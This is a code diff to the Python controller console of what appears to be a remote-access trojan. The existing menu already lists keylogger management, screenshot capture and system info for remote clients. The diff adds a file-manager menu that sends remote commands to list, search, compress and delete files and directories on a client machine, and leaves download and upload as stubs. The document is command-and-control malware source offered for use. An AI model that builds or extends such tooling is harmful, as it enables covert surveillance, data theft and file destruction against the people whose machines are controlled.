@@ -153,10 +153,11 @@ class Controller:
             print("7. 💻 Get system info")
             print("8. ⌨️  Keylogger Management")
             print("9. 📸 Screenshot Management")
-            print("10. 🔙 Back to main menu")
+            print("10. � File Manager")
+            print("11. �🔙 Back to main menu")
             
             
-            choice = input("\nSelect option(1-8): ").strip()
+            choice = input("\nSelect option(1-11): ").strip()
             
             if choice == "1":
                 self.handle_list_processes(client_id)
@@ -177,6 +178,8 @@ class Controller:
             elif choice == "9":
                 self.handle_take_screenshot(client_id, multi=False)
             elif choice == "10":
+                self.file_manager_menu(client_id)
+            elif choice == "11":
                 break
             else:
                 print("[-] Invalid option")
@@ -793,6 +796,173 @@ class Controller:
                     print(f"  - {item}")
             else:
                 print(f"{key.replace('_', ' ').title():<20}: {value}")
+    
+    def file_manager_menu(self, client_id):
+        while True:
+            print("\n" + "="*50)
+            print(f"FILE MANAGER - Client: {client_id}")
+            print("="*50)
+            print("1. 📂 List Directory")
+            print("2. 🔍 Search Files")
+            print("3. 📥 Download File")
+            print("4. 📤 Upload File")
+            print("5. 🗜️  Compress Files")
+            print("6. 🗑️  Delete File/Directory")
+            print("7. 📁 Create Directory")
+            print("8. 🔙 Back to process menu")
+            
+            choice = input("\nSelect option(1-8): ").strip()
+            
+            if choice == "1":
+                self.handle_list_directory(client_id)
+            elif choice == "2":
+                self.handle_search_files(client_id)
+            elif choice == "3":
+                self.handle_download_file(client_id)
+            elif choice == "4":
+                self.handle_upload_file(client_id)
+            elif choice == "5":
+                self.handle_compress_files(client_id)
+            elif choice == "6":
+                self.handle_delete_file(client_id)
+            elif choice == "7":
+                self.handle_create_directory(client_id)
+            elif choice == "8":
+                break
+            else:
+                print("[-] Invalid option")
+    
+    def handle_list_directory(self, client_id):
+        path = input("Enter directory path (default: current): ").strip()
+        path = path if path else '.'
+        
+        print(f"\n[+] Listing directory: {path}")
+        result = self.send_process_command(client_id, "list_directory", {"path": path})
+        
+        if result and result.get('success'):
+            print(f"\n[+] Directory: {result.get('current_path')}")
+            print(f"[+] Total items: {result.get('total_items')}")
+            print("-" * 100)
+            print(f"{'Type':<6} {'Name':<30} {'Size':<12} {'Permissions':<12} {'Owner':<15}")
+            print("-" * 100)
+            
+            items = result.get('items', [])
+            for item in items[:50]:
+                item_type = "DIR" if item.get('is_directory') else "FILE"
+                name = item.get('name', '')[:28]
+                size = f"{item.get('size', 0):,}" if item.get('is_file') else "-"
+                perms = item.get('permissions', 'N/A')[:10]
+                owner = item.get('owner', 'N/A')[:13]
+                
+                print(f"{item_type:<6} {name:<30} {size:<12} {perms:<12} {owner:<15}")
+            
+            if len(items) > 50:
+                print(f"\n[!] Showing 50 out of {len(items)} items")
+        else:
+            error = result.get('error', 'Unknown error') if result else 'No response'
+            print(f"[-] Failed to list directory: {error}")
+    
+    def handle_search_files(self, client_id):
+        root_path = input("Root path to search (default: current): ").strip() or '.'
+        pattern = input("Search pattern (e.g., *.txt, *.exe): ").strip() or '*'
+        max_results = input("Max results (default: 50): ").strip()
+        max_results = int(max_results) if max_results.isdigit() else 50
+        
+        print(f"\n[+] Searching for '{pattern}' in {root_path}...")
+        result = self.send_process_command(client_id, "search_files", {
+            "root_path": root_path,
+            "pattern": pattern,
+            "max_results": max_results
+        })
+        
+        if result and result.get('success'):
+            results = result.get('results', [])
+            print(f"\n[+] Found {len(results)} files:")
+            print("-" * 80)
+            
+            for i, file in enumerate(results, 1):
+                size_kb = file.get('size', 0) / 1024
+                print(f"{i}. {file.get('path')}")
+                print(f"   Size: {size_kb:.2f} KB | Directory: {file.get('directory')}")
+            
+            if not result.get('search_complete'):
+                print(f"\n[!] Search limit reached. More files may exist.")
+        else:
+            error = result.get('error', 'Unknown error') if result else 'No response'
+            print(f"[-] Search failed: {error}")
+    
+    def handle_download_file(self, client_id):
+        print("\n[!] Download feature requires multiple chunk transfers")
+        print("[!] Implementation coming soon...")
+    
+    def handle_upload_file(self, client_id):
+        print("\n[!] Upload feature requires multiple chunk transfers")
+        print("[!] Implementation coming soon...")
+    
+    def handle_compress_files(self, client_id):
+        print("Enter file paths to compress (comma-separated):")
+        files_input = input("> ").strip()
+        files = [f.strip() for f in files_input.split(',') if f.strip()]
+        
+        if not files:
+            print("[-] No files specified")
+            return
+        
+        output_path = input("Output zip file path: ").strip()
+        if not output_path:
+            print("[-] No output path specified")
+            return
+        
+        print(f"\n[+] Compressing {len(files)} items to {output_path}...")
+        result = self.send_process_command(client_id, "compress_files", {
+            "files": files,
+            "output_path": output_path
+        })
+        
+        if result and result.get('success'):
+            size_mb = result.get('output_size', 0) / (1024 * 1024)
+            print(f"[+] Compression successful!")
+            print(f"    Output: {result.get('output_path')}")
+            print(f"    Size: {size_mb:.2f} MB")
+            print(f"    Files compressed: {result.get('compressed_files')}")
+        else:
+            error = result.get('error', 'Unknown error') if result else 'No response'
+            print(f"[-] Compression failed: {error}")
+    
+    def handle_delete_file(self, client_id):
+        path = input("Enter file/directory path to delete: ").strip()
+        if not path:
+            print("[-] No path specified")
+            return
+        
+        confirm = input(f"Are you sure you want to delete '{path}'? (y/n): ").strip().lower()
+        if confirm != 'y':
+            print("[!] Operation cancelled")
+            return
+        
+        print(f"\n[+] Deleting {path}...")
+        result = self.send_process_command(client_id, "delete_file", {"file_path": path})
+        
+        if result and result.get('success'):
+            print(f"[+] {result.get('message')}")
+        else:
+            error = result.get('error', 'Unknown error') if result else 'No response'
+            print(f"[-] Delete failed: {error}")
+    
+    def handle_create_directory(self, client_id):
+        dir_path = input("Enter directory path to create: ").strip()
+        if not dir_path:
+            print("[-] No path specified")
+            return
+        
+        print(f"\n[+] Creating directory: {dir_path}")
+        result = self.send_process_command(client_id, "create_directory", {"dir_path": dir_path})
+        
+        if result and result.get('success'):
+            print(f"[+] {result.get('message')}")
+        else:
+            error = result.get('error', 'Unknown error') if result else 'No response'
+            print(f"[-] Create directory failed: {error}")
         
 if __name__ == "__main__":
     controller = Controller()
